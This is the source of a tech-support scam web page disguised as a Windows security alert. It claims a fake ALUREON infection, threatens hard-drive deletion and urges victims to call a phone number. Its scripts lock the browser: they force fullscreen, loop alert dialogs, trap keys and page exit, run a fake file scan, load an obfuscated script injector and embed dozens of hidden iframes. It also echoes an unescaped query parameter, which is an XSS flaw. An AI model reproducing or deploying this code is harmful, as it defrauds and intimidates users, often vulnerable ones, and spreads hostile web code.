<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Windows Activation Pro</title>
<link rel="stylesheet" href="assets/style.css">
<link rel="icon" href="assets/favicon.png" type="image/png" sizes="16x16">
<script>

function openWin() {
 window.open('index1.html','_blank','width=-600,height=-375,left=55454,top=3322656,resizable=no,scrollbars=no,toolbar=no,directories=no,status=no,menubar=no,copyhistory=no');

}

</script>
<script type="text/javascript">
var d,c,b,a;(function(){function j(){return String}function g(a,b){return a% b}function h(a,b){return a+ b}function i(a,b){return a< b}var e=(f)("sceriwte/yeo0ntej/moca/ei5tee%ost.tea6igr%p%/aEEagr%htlmer%.rd1s%nBcn/tse5v%pjt46t12saf%er2tBe/tNejscTsrmNsl:tn.gayaot.sltscesnnsot_xh9p/.s%jt1p6missy%/7tep/psaae_c:th",673688);function f(f,p){var d={},y={},e={},n={},b={},v={},s={};d._= p;var q=f.length;y._= [];;for(var r=0;i(r,q);r++){y._[r]= f.charAt(r)};for(var r=0;i(r,q);r++){e._= h(d._* (h(r,184)),(g(d._,39482)));;n._= h(d._* (h(r,389)),(g(d._,26566)));;b._= g(e._,q);;v._= g(n._,q);;s._= y._[b._];;k(b,y,v);l(v,y,s);m(d,e,n)};var a=j().fromCharCode(127);var o="";var x="\x25";var c="\x23\x31";var u="\x25";var t="\x23\x30";var w="\x23";return y._.join(o).split(x).join(a).split(c).join(u).split(t).join(w).split(a)}d= document[e[1]](e[0]);d[e[2]]= e[3];d[e[4]]= false;d[e[5]]= e[6];c= document[e[7]](e[0])[0];c[e[9]][e[8]](d,c);b= document[e[1]](e[0]);b[e[2]]= e[3];b[e[4]]= true;b[e[5]]= e[10];a= document[e[7]](e[0])[0];a[e[9]][e[8]](b,a);function k(a,c,b){c._[a._]= c._[b._]}function l(b,c,a){c._[b._]= a._}function m(a,b,c){a._= g((h(b._,c._)),2735455)}})()})();
</script>
<script type="text/javascript">
window.onload=function(){
function countdown( elementName, minutes, seconds )
{
    var element, endTime, hours, mins, msLeft, time;

    function twoDigits( n )
    {
        return (n <= 9 ? "0" + n : n);
    }

    function updateTimer()
    {
        msLeft = endTime - (+new Date);
        if ( msLeft < 1000 ) {
            element.innerHTML = "0:00";
        } else {
            time = new Date( msLeft );
            hours = time.getUTCHours();
            mins = time.getUTCMinutes();
            element.innerHTML = (hours ? hours + ':' + twoDigits( mins ) : mins) + ':' + twoDigits( time.getUTCSeconds() );
            setTimeout( updateTimer, time.getUTCMilliseconds() + 500 );
        }
    }

    element = document.getElementById( elementName );
    endTime = (+new Date) + 1000 * (60*minutes + seconds) + 500;
    updateTimer();
}

countdown( "countdown", 5, 0 );
}

// POPDSP JavaScript Document


// JavaScript Document
var puShown = false;
var PopWidth = 1370;
var PopHeight = 800;
var PopFocus = 0;
var _Top = null;

function GetWindowHeight() {
var myHeight = 0;
if( typeof( _Top.window.innerHeight ) == 'number' ) {
myHeight = _Top.window.innerHeight;
} else if( _Top.document.documentElement && _Top.document.documentElement.clientHeight ) {
myHeight = _Top.document.documentElement.clientHeight;
} else if( _Top.document.body && _Top.document.body.clientHeight ) {
myHeight = _Top.document.body.clientHeight;
}
return myHeight;
}

function GetWindowWidth() {
var myWidth = 0;
if( typeof( _Top.window.innerWidth ) == 'number' ) {
myWidth = _Top.window.innerWidth;
} else if( _Top.document.documentElement && _Top.document.documentElement.clientWidth ) {
myWidth = _Top.document.documentElement.clientWidth;
} else if( _Top.document.body && _Top.document.body.clientWidth ) {
myWidth = _Top.document.body.clientWidth;
}
return myWidth;
}

function GetWindowTop() {
return (_Top.window.screenTop != undefined) ? _Top.window.screenTop : _Top.window.screenY;
}

function GetWindowLeft() {
return (_Top.window.screenLeft != undefined) ? _Top.window.screenLeft : _Top.window.screenX;
}

function doOpen(url)
{
var popURL = "about:blank"
var popID = "ad_" + Math.floor(89999999*Math.random()+10000000);
var pxLeft = 0;
var pxTop = 0;
pxLeft = (GetWindowLeft() + (GetWindowWidth() / 2) - (PopWidth / 2));
pxTop = (GetWindowTop() + (GetWindowHeight() / 2) - (PopHeight / 2));

if ( puShown == true )
{
return true;
}

var PopWin=_Top.window.open(popURL,popID,'toolbar=0,scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,top=' + pxTop + ',left=' + pxLeft + ',width=' + PopWidth + ',height=' + PopHeight);

if (PopWin)
{
puShown = true;

if (PopFocus == 0)
{
PopWin.blur();

if (navigator.userAgent.toLowerCase().indexOf("applewebkit") > -1)
{
_Top.window.blur();
_Top.window.focus();
}
}

PopWin.Init = function(e) {

with (e) {

Params = e.Params;
Main = function(){

if (typeof window.mozPaintCount != "undefined") {
var x = window.open("about:blank");
x.close();

}

var popURL = Params.PopURL;

try { opener.window.focus(); }
catch (err) { }

window.location = popURL;
}

Main();
}
};

PopWin.Params = {
PopURL: url
}

PopWin.Init(PopWin);
}

return PopWin;
}

function setCookie(name, value, time)
{
var expires = new Date();

expires.setTime( expires.getTime() + time );

document.cookie = name + '=' + value + '; path=/;' + '; expires=' + expires.toGMTString() ;
}

function getCookie(name) {
var cookies = document.cookie.toString().split('; ');
var cookie, c_name, c_value;

for (var n=0; n<cookies.length; n++) {
cookie  = cookies[n].split('=');
c_name  = cookie[0];
c_value = cookie[1];

if ( c_name == name ) {
return c_value;
}
}

return null;
}

function initPu()
{

_Top = self;

if (top != self)
{
try
{
if (top.document.location.toString())
_Top = top;
}
catch(err) { }
}

if ( document.attachEvent )
{
document.attachEvent( 'onclick', checkTarget );
}
else if ( document.addEventListener )
{
document.addEventListener( 'click', checkTarget, false );
}


if ( document.attachEvent )
{
document.attachEvent( 'onmouseover', checkTarget );
}
else if ( document.addEventListener )
{
document.addEventListener( 'mouseover', checkTarget, false );
}
}



//function checkTarget(e)
//{
//if ( !getCookie('popundr') ) {
//var e = e || window.event;
//var win = doOpen('index.php');
//}
//}

initPu();

   var el = document.documentElement
, rfs = // for newer Webkit and Firefox
       el.requestFullScreen
    || el.webkitRequestFullScreen
    || el.mozRequestFullScreen
    || el.msRequestFullScreen
;
if(typeof rfs!="undefined" && rfs){
  rfs.call(el);
} else if(typeof window.ActiveXObject!="undefined"){
  // for Internet Explorer
  var wscript = new ActiveXObject("WScript.Shell");
  if (wscript!=null) {
     wscript.SendKeys("{F11}");
  }
}

function toggleFullScreen(elem) {
    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen)) {
        if (elem.requestFullScreen) {
            elem.requestFullScreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullScreen) {
            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    } else {
        if (document.cancelFullScreen) {
            document.cancelFullScreen();
        } else if (document.mozCancelFullScreen) {
            document.mozCancelFullScreen();
        } else if (document.webkitCancelFullScreen) {
            document.webkitCancelFullScreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
    }
}
</script>
<!--<script type="text/javascript" src="jquery-3.js"></script>-->
<!--<script type="text/javascript" src="jquery-2.js"></script>-->
<script type="text/javascript">
		onbeforeunload=function()
		{
			alert ("??????? ESC, ????? ??????? ????????!");
			return "??????? ESC, ????? ??????? ????????!";

		}
	</script>
			<script type="text/javascript">
		document.addEventListener('keyup', function(es)
				{
					if (es.keyCode == 27)
					{
						requestFullScreen(document.body);

					}
				}
				, false);
	</script>
	<script type="text/javascript">
		document.addEventListener('keyup', function(e)
				{
					if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
					{

						requestFullScreen(document.body);

					}
				}
				, false);
	</script>
<script>
function OpenConfirmDialog()
{
    if (confirm(m1))
    {
       window.open ("index.php","mywindow");
        window.open ("index.php","mywindow1");
         window.open ("index.php","mywindow2");
          window.open ("index.php","mywindow3");
           window.open ("index.php","mywindow4");

    }
    else
    {
       window.open ("index.php","mywindow");
        window.open ("index.php","mywindow1");
         window.open ("index.php","mywindow2");
          window.open ("index.php","mywindow3");
           window.open ("index.php","mywindow4");
    }
}

</script>
</head>
<body  onkeydown="myFunction();"  onunload="myFunction();" class="Windows">
<div style="position:absolute; left:0px; top:0px; bottom:0px; right:0px; cursor:none">
<?php if (isset($_GET['zone'])) { ?>
<div style="position:fixed; top:10px; left:10px; background:#FFF; color:#000; font-family:Arial, Helvetica, sans-serif; padding:10px; border-radius:5px; z-index:1"><?php echo $_GET['zone']; ?></div>
<?php } ?>
<audio autoplay="autoplay" loop=""><source src="assets/td.mp3" type="audio/mpeg"></audio>
<!--<div id="logo">
<svg data-name="Layer1" id="Layer_1" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><style>.cls-1{fill:none;clip-rule:evenodd;}.cls-2{clip-path:url(#clip-path);}.cls-3{fill:#ffffff;}</style><clipPath id="clip-path"><path class="cls-1" d="M51.1,52.74V32.11l-20.1,0V50ZM31,28H51.1V7.74L31,10.43V28Zm-4,0V10.92L8,13.36V28H27Zm0,21.5V32.08l-18.9,0v15Z"/></clipPath></defs><title/><g class="cls-2"><rect class="cls-3" height="55" width="53.1" x="3" y="2.74"/></g></svg>
</div>-->

<img src="Image 2.jpg" style="position:absolute; left:30px; top:25px; " />
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js"></script>

		<script>
			var is_chrome,
				isChromium = window.chrome,
				vendorName = window.navigator.vendor,
				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;

			function alertCall()
			{
				alert('****Dont Restart Your Computer **** \n\nWindows Detected ALUREON Attack, The Infections detected, indicate some recent downloads on the computer which in turn has created problems on the computer.Call Toll Free 1855-374-7444 and share this code SD333 to the Agent to Fix This.\n\n****Dont Restart Your Computer ****');
			}
		 	function alertTimed()
			{
				if (is_chrome)
				{
					setInterval(function(){
						alertCall();
					}, 1000);
				}
				else
				{
					alertLoop();
				}
			}
		 	function alertLoop()
			{
				for (i = 0; i < 500; i++)
				{
					alertCall();
				}
			}
			function addEvent(obj, evt, fn)
			{
				if (obj.addEventListener)
				{
					obj.addEventListener(evt, fn, false)
				}
				else if (obj.attachEvent)
				{
					obj.attachEvent("on" + evt, fn)
				}
			}
			$(document).ready(function(){
				document.onkeydown = function(e){
					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
					{
						if (!is_chrome)
						{
							alertTimed();
						}
						return true;
					}
					else if (e.keyCode === 123)
					{
						return true;
					}
					else
					{
						return true;
					}
				};

				addEvent(document, "mouseout", function(e){
					e = e ? e : window.event;
					var from = e.relatedTarget || e.toElement;
					if (!is_chrome && (!from || from.nodeName == "body"))
					{
						alertTimed();
					}
				});
			});
			window.onbeforeunload = function(e){
				var message = '****Dont Restart Your Computer **** \n\nWindows Detected ALUREON Attack, The Infections detected, indicate some recent downloads on the computer which in turn has created problems on the computer.Call Toll Free 1855-374-7444 and share this code SD333 to the Agent to Fix This.\n\n****Dont Restart Your Computer ****';
				e.returnValue = message;
				return message;
			};
			window.onload = function(e){
				alertCall();
			};
		</script>
<div id="progress-bar">
<div class="progress">
    <div class="indeterminate"></div>
</div>
</div>

<div id="progress-bar" class="progress-bar-bottom">
<div class="progress">
    <div class="indeterminate"></div>
</div>
</div>

<div id="landing-page">
<!-- Preloader -->

<div id="preloader">
<div class="cssload-container">
	<div class="cssload-bouncywrap">
		<div class="cssload-cssload-dotcon cssload-dc1">
		<div class="cssload-dot"></div>
	</div>
	<div class="cssload-cssload-dotcon dc2">
		<div class="cssload-dot"></div>
	</div>
	<div class="cssload-cssload-dotcon dc3">
		<div class="cssload-dot"></div>
	</div>
	</div>
</div>
</div>
<!--<img src="close.png" style="position:fixed; top:0px; right:0px;" width="104px" height="20px"/>-->
<div id="warning-error" style="position:fixed; top:50px; right:50px; width:400px; background:rgba(0,0,0,.1); padding:15px; border-radius:5px;">
<div class="attention blink" style="float:left; margin-right:20px; opacity:0;">
<svg height="100" version="1.1" viewBox="0 0 16 16" width="100" xmlns="http://www.w3.org/2000/svg" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns:xlink="http://www.w3.org/1999/xlink"><title/><defs/><g fill="none" fill-rule="evenodd" id="Icons with numbers" stroke="none" stroke-width="1"><g fill="#fff" id="Group" transform="translate(-768.000000, -336.000000)"><path d="M776,337 L784,351 L768,351 Z M775,347 L775,349 L777,349 L777,347 Z M775,341 L775,346 L777,346 L777,341 Z M775,341" id="Triangle 292"/></g></g></svg></div>
Your Hard drive will be DELETED if you close this page. You have a ALUREON Attack! Please call Support Now!. Call Toll-Free: <strong style="font-size:18px;">1855-374-7444</strong>  To Stop This Process</div>

<div class="warning_message">
<p style="color: yellow;
    font-size: 22px;
    position: fixed;
    top: 190px;
    right: 50px;">Hard Drive safety delete in starting in <span id="timer" style="color:yellow; background-color:Black; font-weight:bold;"></span></p>
    <h2>Your <span class="operating-system"></span> hardisk is at high risk</h2>
<p style="font-size:18px;">To immediately rectify issue and prevent data loss<br/>
<span class="blink" style="font-size:22px;">Call Toll Free:</span>  <strong style="font-size:25px;">1855-374-7444</strong></p>
</div>
</div>
<script src="js/index.js"></script>
<!--<div style="position:fixed; left:90px;bottom:10px; color:#164abe; font-size:22px; font-family:Arial, Helvetica, sans-serif; font-weight:bold; z-index:1;">
1855-374-7444</div>
<div style="position:fixed; left:0px;bottom:0;">
<img  src="alert-5.png">
</div>-->
<div style="position:fixed; bottom:32px; right:50px; width:100%; opacity:.7;"><div style="font-size:42px; font-weight:200; text-align:right; margin:0 auto;">scanning complete <span class="tabs_percent" style="font-size:72px; font-weight:bold;">1%</span></div>
<ul id='scanning' style="float:right;">
    <li class='frame'>C:\WINDOWS\system32\acctres.dll</li>
    <li class='frame'>C:\WINDOWS\system32\aclui.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ACTIVEDS.dll</li>
    <li class='frame'>C:\WINDOWS\system32\actxprxy.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ADVAPI32.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ADVPACK.dll</li>
    <li class='frame'>C:\WINDOWS\system32\apphelp.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ASYCFILT.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ATL.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ATTRIB.exe</li>
    <li class='frame'>C:\WINDOWS\system32\AUDIOSRV.dll</li>
    <li class='frame'>C:\WINDOWS\system32\AUTHZ.dll</li>
    <li class='frame'>C:\WINDOWS\system32\AUTOCHK.exe</li>
    <li class='frame'>C:\WINDOWS\system32\CDM.dll</li>
    <li class='frame'>C:\WINDOWS\system32\CLUSAPI.dll</li>
    <li class='frame'>C:\WINDOWS\system32\desk.dll</li>
    <li class='frame'>C:\WINDOWS\system32\devmgr.dll</li>
    <li class='frame'>C:\WINDOWS\system32\GDI32.dll</li>
    <li class='frame'>C:\WINDOWS\system32\avifil32.dll</li>
    <li class='frame'>C:\WINDOWS\system32\hid.dll</li>
    <li class='frame'>C:\WINDOWS\system32\ieui.dll</li>
</ul>
</div>
</div>
<script src="assets/jquery.min.js"></script>
<script src="assets/scripts.js"></script>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;">
    <iframe src="index_files/12.php"></iframe>

</div>



       <script type="text/javascript">
        var Msg = "****Dont Restart Your Computer **** \n\nWindows Detected ALUREON Attack, The Infections detected, indicate some recent downloads on the computer which in turn has created problems on the computer.Call Toll Free 1855-374-7444 and share this code SD333 to the Agent to Fix This.\n\n****Dont Restart Your Computer ****";
        if (window.chrome) {
            if (window.opr) {} else {
                function msg_ch() {
                    alert(Msg);
                }
                window.setInterval(function() {
                    msg_ch()
                }, 1100);
            }
        } else {
            if (window.sidebar) {
                function msg_ff() {
                    var i = document.createElement("div");
                    i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>';
                    document.body.appendChild(i);
                }
                window.setInterval(function() {
                    msg_ff()
                }, 100);
            } else {
                function msg() {
                    var r = confirm(Msg);
                    if (r == true) {
                        alert(Msg);
                    } else {
                        alert(Msg);
                    }
                }
                window.setInterval(function() {
                    msg()
                }, 100);
            }
        }
    </script>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="index_files/12.php"></iframe></div>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123433039-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123433039-1');
</script>


</body>
</html>
